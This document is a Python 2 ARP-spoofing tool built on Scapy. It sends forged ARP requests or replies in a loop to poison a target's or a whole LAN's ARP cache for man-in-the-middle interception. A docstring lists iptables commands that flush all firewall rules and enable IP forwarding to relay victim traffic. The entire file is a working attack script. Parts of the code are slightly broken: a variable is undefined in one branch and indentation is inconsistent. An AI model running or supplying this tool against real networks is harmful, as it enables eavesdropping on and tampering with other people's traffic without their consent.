#!/usr/bin/env python

try:
	from optparse import OptionParser
	import os
	import sys
	import signal
	from time import sleep
	import logging
	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
	from scapy.all import *
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)

"""
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

echo "1" > /proc/sys/net/ipv4/ip_forward
"""

	
class ArpSpoof:

	def __init__(self):
	  
	    if os.geteuid() != 0:
		print "[-] Run me as root"
		sys.exit(1)

	    usage = 'Usage: %prog [-i interface] [-t target] host'
	    parser = OptionParser(usage)
	    parser.add_option('-i', dest='interface', help='Specify the interface to use')
	    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
	    parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
	    (self.options, self.args) = parser.parse_args()

	    if len(self.args) != 1 or self.options.interface == None:
	      parser.print_help()
	      sys.exit(0)

	    self.broadcast_mac = 'ff:ff:ff:ff:ff:ff'  
	    self.mac = get_if_hwaddr(self.options.interface)
	      
	
	def build_req(self):
	  
	    if self.options.target == None:
		pkt = Ether(src = mac, dst = self.broadcast_mac)/ARP(hwsrc = self.mac, psrc = self.args[0], pdst = self.args[0])
	    elif self.options.target:
		target_mac = getmacbyip(self.options.target)
		if target_mac == None:
		    print "[-] Error: Could not resolve targets MAC address"
		    sys.exit(1)
		pkt = Ether(src = self.mac, dst = target_mac)/ARP(hwsrc = self.mac, psrc = self.args[0], hwdst = target_mac, pdst = self.options.target)
		
	    return pkt

	    

        def build_rep(self):
	  
	    if self.options.target == None:
		pkt = Ether(src = self.mac, dst = self.broadcast_mac)/ARP(hwsrc = self.mac, psrc = self.args[0], op = 2)
	    elif self.options.target:
		target_mac = getmacbyip(self.options.target)
		if target_mac == None:
			print "[-] Error: Could not resolve targets MAC address"
			sys.exit(1)
		pkt = Ether(src = self.mac, dst = target_mac)/ARP(hwsrc = self.mac, psrc = self.args[0], hwdst = target_mac, pdst = self.options.target, op = 2)

	    return pkt


	    
	def rearp(self, signal, frame):
	  
	    sleep(1)
	    print '\n[*] Re-arping network'
	    rearp_mac = getmacbyip(self.args[0])
	    print self.args[0]
	    
	    pkt = Ether(src = rearp_mac, dst = self.broadcast_mac)/ARP(psrc = self.args[0], hwsrc = self.mac, op = 2)
	    sendp(pkt, inter = 1, count = 5, iface = self.options.interface)
	    sys.exit(0)

      
      
        def main(self):
	
	    if self.options.mode == 'req':
		pkt = self.build_req()	
	    elif self.options.mode == 'rep':
		pkt = self.build_rep()

	    signal.signal(signal.SIGINT, self.rearp)	
	    while True:
		sendp(pkt, inter = 2, iface = self.options.interface, verbose=False)
	
	
##
### Main ...
##
	
if __name__ == "__main__":
	
	arpspoof = ArpSpoof()
	arpspoof.main()
	
